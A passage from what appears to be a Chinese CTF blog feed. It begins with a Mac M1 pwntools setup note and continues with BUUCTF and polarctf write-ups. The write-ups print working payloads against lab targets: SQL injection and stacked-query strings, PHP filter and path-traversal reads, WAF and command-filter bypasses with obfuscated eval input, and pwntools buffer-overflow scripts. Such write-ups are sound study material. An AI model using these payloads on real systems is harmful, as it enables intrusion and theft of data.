sections</code>发现pwntools 本身带有的lib 有问题(是否有可能在未来的版本解决？)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/opt/homebrew/Cellar/pwntools/4.3.1/libexec/lib/python3.9/site-packages/unicorn/lib/libunicorn.dylib</span><br></pre></td></tr></table></figure><p>而DYLD_LIBRARY_PATH 不可用(可能受到SIP 限制) 可以使用install_name_tool 或disable SIP 之类的，不过这里打算用打补丁的方式，或许某天unicorn 或pwntools 会释出解决方案等等。</p><p>透过<code>brew install --build-from-source unicorn</code>安装的unicorn 依然会有这样的问题，就算确保路径在<code>opt/homebrew/Cellar/unicorn/1.0.2_1</code>，而解决方案是：</p><ol><li>安装x86_64 版本的<code>unicorn</code>，方法参见网路上装x86_64 brew 的方法即可，这里透过<code>ibrew</code>来称呼x86_64 版的brew</li><li>建立软连结取代pwntools 的unicorn</li></ol><p>检视安装的路径</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ibrew info unicorn</span><br></pre></td></tr></table></figure><p>之后可以得到我们自行安装的unicorn 位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/local/Cellar/unicorn/1.0.2_1/lib/python3.9/site-packages/unicorn/lib</span><br></pre></td></tr></table></figure><p>执行脚本，透过软连结覆盖掉档案</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x86_unicorn_path=/usr/local/Cellar/unicorn/1.0.2_1/lib/python3.9/site-packages/unicorn/lib</span><br><span class="line">pwntools_unicorn_path=/opt/homebrew/Cellar/pwntools/4.3.1/libexec/lib/python3.9/site-packages/unicorn/lib/</span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$pwntools_unicorn_path</span>/back/</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$pwntools_unicorn_path</span>/* <span class="variable">$pwntools_unicorn_path</span>/back/</span><br><span class="line"><span class="built_in">ln</span> -s <span class="variable">$x86_unicorn_path</span>/* <span class="variable">$pwntools_unicorn_path</span>/</span><br></pre></td></tr></table></figure><p>这个脚本保留了原始档案以便还原，如果修改不回来，重新安装pwntools 应该也可以还原原始档案。接下来执行exploit.py 就可以正常执行<code>ELF()</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Mac m1的CTF环境配置" scheme="https://guipi01.github.io/categories/Mac-m1%E7%9A%84CTF%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Mac m1的binutils配置" scheme="https://guipi01.github.io/tags/Mac-m1%E7%9A%84binutils%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_WP</title>
    <link href="https://guipi01.github.io/posts/ccc6fa83.html"/>
    <id>https://guipi01.github.io/posts/ccc6fa83.html</id>
    <published>2025-04-06T06:04:36.000Z</published>
    <updated>2025-04-06T10:10:03.675Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>PHP反序列化</p><p>实现的函数是serialize()和unseralize()</p><p>序列化数据格式：</p><div class="table-container"><table><thead><tr><th>数据类型</th><th>序列化数据结构</th></tr></thead><tbody><tr><td>对象</td><td>O:length:class name:attribute number:{attr1;value1;attr2;value2;}</td></tr><tr><td>字符串</td><td>S:length:value;</td></tr><tr><td>整数</td><td>i:value;</td></tr><tr><td>布尔</td><td>b:value;</td></tr><tr><td>空值</td><td>N;</td></tr><tr><td>浮点数</td><td>d:value;</td></tr></tbody></table></div><p>反序列化题目做题步骤：</p><ol><li>复制源代码到本地</li><li>注释掉和属性无关的内容</li><li>根据题目需要，给属性赋值(这是关键)</li><li>生成序列化数据，通常要URL编码<code>urlcode(serialize($d))</code></li><li>传递数据到服务器(攻击目标)</li></ol><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 17.15.16.png" alt="截屏2025-02-24 17.15.16" style="zoom:50%;" /></p><p>create_function函数</p><p>create_function(string $args,string $code),创建函数的简单方式</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>首先查看源代码，找到Archive_room.php文件，访问该文件点击SECRET用bp拦截找到了另一个文件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 08.44.03.png" alt="截屏2025-02-19 08.44.03" style="zoom:50%;" /></p><p>访问secr3t.php这个文件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 08.44.42.png" alt="截屏2025-02-19 08.44.42" style="zoom:50%;" /></p><p>直接访问flag.php发现访问不了，想起使用?file=php://filter/read=convert.base64-encode/resource=flag.php来获取文件，于是在secr3t.php页面构建URL：</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 08.45.48.png" alt="截屏2025-02-19 08.45.48" style="zoom:50%;" /></p><p>直接base64解码找到flag</p><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>首先查看网页源代码发现Secret.php文件，访问后</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 21.35.43.png" alt="截屏2025-02-19 21.35.43" style="zoom:50%;" /></p><p>使用Referer: <a href="https://Sycsecret.buuoj.cn">https://Sycsecret.buuoj.cn</a></p><p>出现了下边的内容，然后使用User-Agent: Syclover</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 21.36.46.png" alt="截屏2025-02-19 21.36.46"></p><p>出现了下边的信息，使用X-Forwarded-For: 127.0.0.1</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 21.37.35.png" alt="截屏2025-02-19 21.37.35" style="zoom:50%;" /></p><p>最后得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-19 21.38.01.png" alt="截屏2025-02-19 21.38.01" style="zoom:50%;" /></p><h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>首先查看响应头找到了有用的信息</p><p>hint：select * from ‘admin’ where password=md5($pass,true)</p><p>然后通过输入<strong>ffifdyop</strong>进行绕过，因为当输入 <code>ffifdyop</code> 时，其 MD5 值为 <code>276f722736c95d99e921722cf9ed621c</code>。在 MySQL 中，这个二进制格式的 MD5 值会被解析为字符串 <code>&#39;or&#39;6&lt;乱码&gt;</code>。</p><p><code>SELECT * FROM &#39;admin&#39; WHERE password=&#39;&#39; or &#39;6&lt;乱码&gt;&#39;</code></p><p>输入之后网页源码中出现了提示，进行绕过</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-20 14.25.39.png" alt="截屏2025-02-20 14.25.39"></p><p>在用GET方式通过a=QNKCDZO&amp;b=240610708进行绕过，出现了POST的提示</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-20 14.26.57.png" alt="截屏2025-02-20 14.26.57" style="zoom:50%;" /></p><p>发现是强比较!==要通过数组进行绕过，构造payload</p><p><code>param1[]=1&amp;param2[]=2</code></p><p>进行绕过得到了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-20 14.28.44.png" alt="截屏2025-02-20 14.28.44" style="zoom:50%;" /></p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：</p><p><code>/?foo=bar变成Array([foo] =&gt; &quot;bar&quot;)</code>。</p><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><blockquote><p>1.删除空白符</p><p>2.将某些字符转换为下划线（包括空格）</p></blockquote><p>通过输入字母a显示了下边的内容，说明被WAF拦截了，那么需要绕过这个WAF就需要让WAF识别不了字母，当WAF识别到有字母的时候就会拦截，可以考虑用<strong>%20(空格)</strong>来绕过</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-21 11.25.39.png" alt="截屏2025-02-21 11.25.39" style="zoom:50%;" /></p><p>当URL输入<code>/calc.php?%20num=a</code>的时候会，出现字母a，说明绕过了WAF，那么就可以进行骚操作了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-21 11.28.07.png" alt="截屏2025-02-21 11.28.07" style="zoom:50%;" /></p><p>使用<code>var_dump(scandir(chr(47)))</code>来扫描目录有什么，发现了flag目录为f1agg应该就是flag了，那么我们就需要查看f1agg文件的内容是否是flag了</p><ul><li><p>scandir():列出 参数目录 中的文件和目录，要不然我们怎么知道flag在哪。</p></li><li><p>因为过滤了”/“符号，所以我们用chr(47)进行绕过</p></li></ul><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-21 11.29.41.png" alt="截屏2025-02-21 11.29.41" style="zoom:50%;" /></p><p>下边的查看f1agg文件的内容<code>/calc.php?num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>得到了flag</p><p><code>file_get_contents查看文件的内容</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-21 11.36.00.png" alt="截屏2025-02-21 11.36.00" style="zoom:50%;" /></p><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>首先访问网站发现是一个登录框，然后进行1’ or 1#闭合一下发现了可以绕过</p><p>出现了admin的密码，然后继续判断一下字段使用order by</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-22 18.20.15.png" alt="截屏2025-02-22 18.20.15"></p><p>从1输入到3发现是错误，<code>1&#39;order by 3#</code>当换成4的时候出显了报错</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-22 18.21.06.png" alt="截屏2025-02-22 18.21.06"></p><p>报错信息是下边的图片，说明只有三个字段，那么就通过这三个字段来试一下<code>1&#39;union select 1,2,3#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-22 18.22.27.png" alt="截屏2025-02-22 18.22.27"></p><p>发现了在2的时候出现了登录成功，那么就通过2来获取数据库的表名</p><p><code>1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-22 18.23.25.png" alt="截屏2025-02-22 18.23.25"></p><p>出现了两个表明，我们来查看一下<code>l0ve1ysq1</code>这个表首先查看一下表的字段发现有username和password和id</p><p><code>1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-22 18.27.22.png" alt="截屏2025-02-22 18.27.22"></p><p>然后查看一下内容<code>1&#39; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#</code></p><p>出现了flag</p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>首先一个输入框，判断是不是sql注入，输入<code>1&#39;or 1=1#</code>,判断是sql注入</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.13.02.png" alt="截屏2025-03-08 15.13.02" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.16.22.png" alt="截屏2025-03-08 15.16.22" style="zoom:50%;" /></p><p>然后查看一下有多少字段，<code>1&#39;order by 3;#</code>到3的时候报错了，应该是两个，后边使用<code>&#39;union select 1,2;#</code>发现被过滤了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.17.42.png" alt="截屏2025-03-08 15.17.42" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.18.51.png" alt="截屏2025-03-08 15.18.51" style="zoom:50%;" /></p><p>然后使用堆叠注入查看数据库，表名<code>&#39;;show databases;#</code> <code>&#39;;show tables;#</code> ,查看表的字段，发现1919810931114514这个表中有flag字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514 `;#</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.20.09.png" alt="截屏2025-03-08 15.20.09" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-08 15.21.56.png" alt="截屏2025-03-08 15.21.56" style="zoom:50%;" /></p><p>到这里没思路了，看了网上的解析</p><ol><li><p>通过 rename 先把 words 表改名为其他的表名。</p></li><li><p>把 1919810931114514 表的名字改为 words 。</p></li><li><p>给新 words 表添加新的列名 id 。</p></li><li><p>将 flag 改名为 data 。</p></li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure><p>解法2:</p><p>因为select被过滤了，所以先将select * from <code>1919810931114514</code>进行16进制编码</p><p>再通过构造payload，得</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br><span class="line"><span class="string">SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值，如下：</span></span><br><span class="line"><span class="string">复制代码 代码如下:</span></span><br><span class="line"><span class="string">SELECT @VAR1=‘Y’,@VAR2=‘N’</span></span><br><span class="line"><span class="string">– 而SET要达到同样的效果，需要：</span></span><br><span class="line"><span class="string">SET @VAR1=‘Y’</span></span><br><span class="line"><span class="string">SET @VAR2=‘N’</span></span><br><span class="line"><span class="string">prepare…from…是预处理语句，会进行编码转换。</span></span><br><span class="line"><span class="string">execute用来执行由SQLPrepare创建的SQL语句</span></span><br></pre></td></tr></table></figure><p>解法3:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span></span><br></pre></td></tr></table></figure><p><code>HANDLER</code> 是 MySQL 提供的一种低级接口，用于直接操作表中的数据。它允许用户以一种更直接和高效的方式访问表中的记录，通常用于需要快速访问单条记录的场景。</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>首先分析一下源码，住函数有一个sub_40060D这个函数是<code>cat flag.txt</code>，通过分析应该是栈溢出来调用<code>sub_40060D()</code>这个函数来获得flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 16.03.54.png" alt="截屏2025-03-07 16.03.54" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 16.04.08.png" alt="截屏2025-03-07 16.04.08" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 16.04.28.png" alt="截屏2025-03-07 16.04.28" style="zoom:50%;" /></p><p>那么编写exp，来获得flag吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27386</span>)</span><br><span class="line">padding = <span class="number">0x40</span> + <span class="number">8</span>                    <span class="comment">#v5的rbp栈，通过这个栈来溢出</span></span><br><span class="line">sub_addr = <span class="number">0x40060D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(sub_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 16.08.05.png" alt="截屏2025-03-07 16.08.05" style="zoom:50%;" /></p><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>首先分析源码，发现有一个func函数，里边有cat /flag，那就就想着栈溢出调用这个地址，发现有gets函数，应该就是栈溢出了，下边比较了v2的值，开始构造exp吧</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 17.32.00.png" alt="截屏2025-03-07 17.32.00" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 17.43.33.png" alt="截屏2025-03-07 17.43.33" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27579</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x4006BE</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(flag_addr)</span><br><span class="line"><span class="comment"># 或者通过v1和v2的偏移量来构造payload</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * 0x2c + p64(0x41348000)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://guipi01.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://guipi01.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>polarctf_wp</title>
    <link href="https://guipi01.github.io/posts/bcd86d8.html"/>
    <id>https://guipi01.github.io/posts/bcd86d8.html</id>
    <published>2025-04-05T13:23:59.000Z</published>
    <updated>2025-04-06T10:09:49.693Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="polarctf靶场"><a href="#polarctf靶场" class="headerlink" title="polarctf靶场"></a>polarctf靶场</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>进入url发现这样一句话，然后看了看cookie，发现value为no，改为yes，发现了base64加密的字符串<br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.26.16.png" alt="图片"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.27.32.png" alt="截屏2025-03-09 19.26.16" style="zoom:50%;" /></p><p>经过base64解码，得到一个路径，访问看到了源码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.28.57.png" alt="截屏2025-03-09 19.28.57" style="zoom:50%;" /></p><p>经过分析，应该是一个伪协议读取，构造payload得到base64解码就可以dedaoflag了,因为后边加了.php所以payload中不需要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=..././..././..././..././flag</span><br></pre></td></tr></table></figure><h3 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h3><p>首先访问的URL出现了下边的代码，分析一下，首先是一个no函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;            <span class="comment">//定义一个no函数，并传入变量txt</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;       <span class="comment">//preg_match 函数用于执行一个正则表达式匹配</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;            <span class="comment">//返回参数值</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);   <span class="comment">//输出一条消息，并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);        <span class="comment">//通过POST方式传递参数yyds</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;  <span class="comment">//通过GET方式传递参数sys；并判断</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));            <span class="comment">//调用no函数，并输出</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;                    <span class="comment">//输出nonono    </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.11.30.png" alt="截屏2025-02-24 14.11.30"></p><p>PHP代码的命令执行函数有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() 输出并返回最后一行shell结果。</span><br><span class="line"><span class="title function_ invoke__">exec</span>() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()/<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="comment">//输出函数：</span></span><br><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br><span class="line">sort    文本内容排列</span><br><span class="line">uniq    可以查看</span><br><span class="line">vim     一种编辑器，这个也可以查看</span><br><span class="line">od      以二进制的方式读取档案内容</span><br><span class="line">vi      一种编辑器，这个也可以查看</span><br><span class="line">strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line">paste    把每个文件以列对列的方式，一列列地加以合并</span><br><span class="line">grep    grep &#123; flag.php打印有”&#123;“的一行</span><br><span class="line">sed        一种编辑器，可以用sed -f flag.php读取flag</span><br><span class="line"><span class="comment">//空格绕过：</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">重定向符：&lt;&gt;（但是不支持后面跟通配符）</span><br><span class="line">水平制表符%<span class="number">09</span></span><br><span class="line">%<span class="number">0</span>a 回车</span><br><span class="line">%<span class="number">0</span>d换行</span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">%<span class="number">09</span>(tab)</span><br><span class="line">%<span class="number">20</span>(space)</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure><p>方法一：使用未被过滤的函数passthru进行绕过<code>/?sys=passthru(&quot;ls%09/&quot;);</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.15.png" alt="截屏2025-02-24 14.19.15" style="zoom:50%;" /></p><p>方法二：使用转义字符过滤,适用PHP版本PHP&gt;=7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">以八进制表示的\[<span class="number">0</span>–<span class="number">7</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;转义字符会自动适配byte（如<span class="string">&quot;\400&quot;</span> == “\<span class="number">000</span>”）</span><br><span class="line">以十六进制的\x[<span class="number">0</span>–<span class="number">9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;转义字符表示法（如“\x41<span class="string">&quot;）</span></span><br><span class="line"><span class="string">以Unicode表示的\u&#123;[0–9A-Fa-f]+&#125;字符，会输出为UTF-8字符串</span></span><br><span class="line"><span class="string">URL编码协议规定（即 RFC3986 协议）：URL 中只允许包含英文字母、数字、以及这 4 个 - _ . ~ 特殊字符和所有的保留字符</span></span><br><span class="line"><span class="string">sys=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.44.png" alt="截屏2025-02-24 14.19.44" style="zoom:33%;" /></p><h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>发现是文件泄漏，使用dirsearch惊喜目录扫描，发现了/.index.php.swp文件，访问得到了代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jiuzhe</span>(<span class="params"><span class="variable">$xdmtql</span></span>)</span>&#123; <span class="comment">//接受一个xdmtql变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys.*nb/is&#x27;</span>,<span class="variable">$xdmtql</span>); <span class="comment">//匹配变量</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xdmtql</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;xdmtql&#x27;</span>]; <span class="comment">//判断变量是否为数组类型，不为数组类型往下判断</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$xdmtql</span>))&#123;  <span class="comment">//利用jiuzhe函数进行匹配输入的值</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">jiuzhe</span>(<span class="variable">$xdmtql</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$xdmtql</span>,<span class="string">&#x27;sys nb&#x27;</span>)!==<span class="literal">false</span>)&#123;  <span class="comment">//绕过 preg_match函数后匹配变量，匹配到的话输出flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;*******&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;true .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nijilenijile&#x27;</span>;  <span class="comment">//匹配到/sys.*nb/is的话输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用py脚本,去匹配字符，最后得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://9c50bb87-6bff-49ba-8089-2f0065677fd6.www.polarctf.com:8090/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;xdmtql&quot;</span>: <span class="string">&quot;sys nb&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span>&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure><h3 id="被黑掉的网站"><a href="#被黑掉的网站" class="headerlink" 